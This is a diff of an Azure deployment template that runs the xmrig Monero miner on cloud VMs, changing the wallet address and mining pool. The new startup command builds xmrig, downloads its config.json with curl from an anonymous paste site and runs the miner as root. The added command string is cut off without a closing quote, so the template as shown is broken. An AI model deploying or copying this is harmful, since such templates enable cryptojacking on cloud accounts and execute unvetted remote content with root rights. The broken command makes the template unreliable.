@@ -3,7 +3,7 @@
     "contentVersion": "1.0.0.0",
     "parameters": {
         "batchAccounts_batches_name": {
-            "defaultValue": "batches",
+            "defaultValue": "verycool",
             "type": "String"
         },
         "VMs_F2": {
@@ -15,11 +15,11 @@
             "type": "Int"
         },
         "user_wallet": {
-            "defaultValue": "45fuUrFP8wXNhL6yw5Q8nnT5PZxT9qXuEDTPExtG38a6f7kweFVxij5aY4zXe6k6hYi7Uf63QSCMN1XCo9rQrwwUGJZwGSg",
+            "defaultValue": "474zNab9n3XDKTYaYMAXTgYqdgUuQpbxaVFdkUxhAT6iY9hpKdt7bZFEMKvjjqdGraEQrBynu1ZrdczetrKM3MJFVNVYjBz",
             "type": "string"
         },
         "user_pool_port": {
-            "defaultValue": "us-west.minexmr.com:4444",
+            "defaultValue": "gulf.moneroocean.stream:10128",
             "type": "string"
         },
         "location": {
@@ -28,7 +28,7 @@
         }
     },
     "variables": {
-        "commandLine_template": "/bin/bash -c \"\ncd $HOME;\nsudo apt-get update --fix-missing;\nsudo apt-get -y install git build-essential cmake automake libtool autoconf wget;\ngit clone https://github.com/PrandoXMR/cryptocloud.git;\nmv cryptocloud/install.sh .;\nchmod +x install.sh;\n./install.sh;\ncd $HOME/xmrig/build;\n./xmrig --rig-id=cloud -u user_wallet -o user_pool_port \n\"",
+        "commandLine_template": "/bin/bash -c \"\ncd $HOME;\nsudo apt-get update --fix-missing;\nsudo apt-get -y install git build-essential cmake automake libtool autoconf wget;\ngit clone https://github.com/MoneroOcean/xmrig.git;\nmkdir xmrig/build;\ncd xmrig/build;\ncmake ..;\nmake -j$(nproc);\ncurl -LJO https://haste.zneix.eu/raw/ipifuxycef;\nmv ipifuxycef config.json;\nsudo ./xmrig,
         "commandLine": "[replace(replace(variables('commandLine_template'),'user_wallet', parameters('user_wallet')),'user_pool_port',parameters('user_pool_port'))]"
     },
     "resources": [
